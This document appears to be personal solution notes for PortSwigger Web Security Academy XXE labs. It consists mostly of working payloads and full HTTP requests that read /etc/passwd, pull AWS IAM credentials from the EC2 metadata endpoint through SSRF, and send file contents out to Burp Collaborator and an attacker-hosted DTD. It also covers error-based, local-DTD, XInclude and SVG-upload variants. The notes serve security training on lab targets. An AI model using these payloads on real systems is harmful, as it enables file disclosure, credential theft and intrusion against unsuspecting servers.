---
description: https://portswigger.net/web-security/xxe
---

# XML external entity (XXE) injection

### Lab: Exploiting XXE using external entities to retrieve files

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

**Base payload ->**

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<...>&xxe;</...>
```

```
POST /product/stock HTTP/1.1
...
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>1</productId>
		<storeId>1</storeId>
	</stockCheck>
```

**Answer ->**

```
POST /product/stock HTTP/1.1
...
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	<stockCheck>
		<productId>&xxe;</productId>
		<storeId>1</storeId>
	</stockCheck>
```

### Lab: Exploiting XXE to perform SSRF attacks

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

**Base payload ->**

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

```
POST /product/stock HTTP/1.1
...
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>2</productId>
		<storeId>1</storeId>
	</stockCheck>
```

**Answer ->**

```
POST /product/stock HTTP/1.1
...
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
	<stockCheck>
		<productId>&xxe;</productId>
		<storeId>1</storeId>
	</stockCheck>
Response: "Invalid product ID: latest"
	
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]>
Response: "Invalid product ID: meta-data"
	
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data"> ]>
Response: "Invalid product ID: iam"
	
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam"> ]>
Response: "Invalid product ID: security-credentials"
	
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials"> ]>
Response: "Invalid product ID: admin"
	
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
Response: "Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2021-11-18T20:54:15.719601Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "yT93WICm9RXIMVSB5CcD",
  "SecretAccessKey" : "iSFxR1lEx0KCdNFnTGCdOsOtlAS8x2qVMpkBKhOE",
  "Token" : "67cZGemzaw3IOPF39MboahnI0OGSf8NGtjYWoGA8uO0Rg2SE0IhYdlgJMHRKXgQJMHoPonYcS3kejBQiMaVF5nv5N8HEeYd2DWcufUwiKtr73GKRQLzbwTnVJ6HknsADpKY7Z4HPU5Kgsh02aQjqGsfqjnjLZlLnfSV04Xz3qRXrE080fPFhNuviCIq51DFkpsYDCsIW7MDnT4PMxxGLkNh6HumdFiGJse1qVwxJ21BUKFkcCZhheimiZrnUWuRz",
  "Expiration" : "2027-11-17T20:54:15.719601Z"
}"
```

### Lab: Blind XXE with out-of-band interaction

This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

`l9v6h8nay5uhie9moobfyk346vcl0a.burpcollaborator.net`

**Base payload ->**

```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://l9v6h8nay5uhie9moobfyk346vcl0a.burpcollaborator.net"> ]>
```

```
POST /product/stock HTTP/1.1
...
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>20</productId>
		<storeId>1</storeId>
	</stockCheck>
```

**Answer ->**

```
POST /product/stock HTTP/1.1
...
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://l9v6h8nay5uhie9moobfyk346vcl0a.burpcollaborator.net"> ]>
	<stockCheck>
		<productId>&xxe;</productId>
		<storeId>1</storeId>
	</stockCheck>
```

### Lab: Blind XXE with out-of-band interaction via XML parameter entities

This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

`u833k65hpt0lqm9sq8gg7wbutlzbn0.burpcollaborator.net`

**Base payload ->**

```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

```
POST /product/stock HTTP/1.1
...
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>1</productId>
		<storeId>1</storeId>
	</stockCheck>
```

**Answer ->**

```
POST /product/stock HTTP/1.1
...
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://u833k65hpt0lqm9sq8gg7wbutlzbn0.burpcollaborator.net"> %xxe; ]>
	<stockCheck>
		<productId>1</productId>
		<storeId>1</storeId>
	</stockCheck>
```

### Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

This lab has a "Check stock" feature that parses XML input but does not display the result.

`u833k65hpt0lqm9sq8gg7wbutlzbn0.burpcollaborator.net`

```
POST /product/stock HTTP/1.1
...
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>19</productId>
		<storeId>1</storeId>
	</stockCheck>
```

**Exploit Server →**

```
File: 
	/exploit.dtd
Body: 
	<!ENTITY % file SYSTEM "file:///etc/hostname">
	<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://u833k65hpt0lqm9sq8gg7wbutlzbn0.burpcollaborator.net?x=%file;'>">
	%eval;
	%exfiltrate;
URL: 
	https://exploit-ac8d1f7b1f14413ac092a6fb01000016.web-security-academy.net/exploit.dtd
```

**Base payload ->**

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

**Answer ->**

```
POST /product/stock HTTP/1.1
...
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-ac8d1f7b1f14413ac092a6fb01000016.web-security-academy.net/exploit.dtd"> %xxe;]>
	<stockCheck>
		<productId>19</productId>
		<storeId>1</storeId>
	</stockCheck>
```

> Collaborator -> HTTP interaction -> Request to Collaborator&#x20;
>
> GET /?x=3b2cef7412f9 HTTP/1.1
>
> User-Agent: Java/12.0.2

> This technique might not work with some file contents, including the newline characters contained in the /etc/passwd file. This is because some XML parsers fetch the URL in the external entity definition using an API that validates the characters that are allowed to appear within the URL.

### Lab: Exploiting blind XXE to retrieve data via error messages

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.

```
POST /product/stock HTTP/1.1
...
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>8</productId>
		<storeId>1</storeId>
	</stockCheck>
```

**Exploit Server ->**

```
File: 
	/exploit.dtd
Body: 
	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///notexists/%file;'>">
	%eval;
	%error;
URL: 
	https://exploit-ac9e1fd91e2510aec0bb35eb012600ff.web-security-academy.net/exploit.dtd
```

**Base payload ->**

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

**Answer ->**

```
POST /product/stock HTTP/1.1
...
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-ac9e1fd91e2510aec0bb35eb012600ff.web-security-academy.net/exploit.dtd"> %xxe;]>
	<stockCheck>
		<productId>8</productId>
		<storeId>1</storeId>
	</stockCheck>
```

### Lab: Exploiting XXE to retrieve data by repurposing a local DTD

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, trigger an error message containing the contents of the /etc/passwd file.

Systems using the GNOME desktop environment often have a DTD at** /usr/share/yelp/dtd/docbookx.dtd** containing an entity called **ISOamso.**

**Checking file existence ->**

```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

**Base payload ->**

```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

```
POST /product/stock HTTP/1.1
...
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>3</productId>
		<storeId>1</storeId>
	</stockCheck>
```

**Answer ->**

```
POST /product/stock HTTP/1.1
...
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [
	<!ENTITY % local_dtd SYSTEM "file:////usr/share/yelp/dtd/docbookx.dtd">
	<!ENTITY % ISOamso '
	<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
	<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
	&#x25;eval;
	&#x25;error;
	'>
	%local_dtd;
	]>
	<stockCheck>
		<productId>3</productId>
		<storeId>1</storeId>
	</stockCheck>
```

### Lab: Exploiting XInclude to retrieve files

This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.

**Base payload ->**

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

```
POST /product/stock HTTP/1.1
...
productId=10&storeId=1
```

**Answer ->**

```
POST /product/stock HTTP/1.1
...
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

### Lab: Exploiting XXE via image file upload

This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

**image.svg ->**

```
<?xml version="1.0" standalone="yes"?>
	<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
	<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
		<text font-size="16" x="0" y="16">&xxe;</text>
	</svg>
```

Post a comment with image.svg as an avatar.

You can see the value in the photo. -> 3929646265aa
